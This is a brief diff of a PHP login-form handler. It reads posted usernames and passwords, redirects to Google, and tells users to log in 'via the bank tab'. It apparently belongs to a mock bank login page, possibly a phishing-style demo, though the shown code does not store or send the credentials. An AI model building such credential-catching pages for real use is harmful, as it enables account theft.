@@ -10,12 +10,11 @@ if(isset($_POST["submit"]))
 	{
 		$username = isset($_POST["username"]) ? $_POST["username"] : "Default";
 		$password = isset($_POST["password"]) ? $_POST["password"] : "Default";
-		echo "Welcome {$username}";
 		echo"";?> <meta http-equiv="refresh" content="0;url=http://www.Google.com" /><?php 
 	}
 else 
 	{
-		echo "Form was not succesfully submitted";
+		echo "You did not submit the form, please do not type just the url, and instead login via the bank tab";
 	}
  ?>
 	</body>
